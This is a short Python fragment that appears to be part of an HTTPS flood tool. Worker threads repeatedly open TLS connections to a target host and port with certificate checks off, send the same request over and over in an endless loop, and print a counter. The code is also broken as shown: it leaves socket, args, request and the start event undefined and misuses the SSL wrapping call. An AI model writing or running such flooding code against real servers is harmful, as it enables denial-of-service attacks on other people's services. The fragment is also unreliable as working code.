import ssl
import threading

class RequestDefaultHTTPS(threading.Thread):

    go = threading.Event

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s = ssl.SSLContext.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

                s.send(str.encode(request))
                print('Request is sent: ' , self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()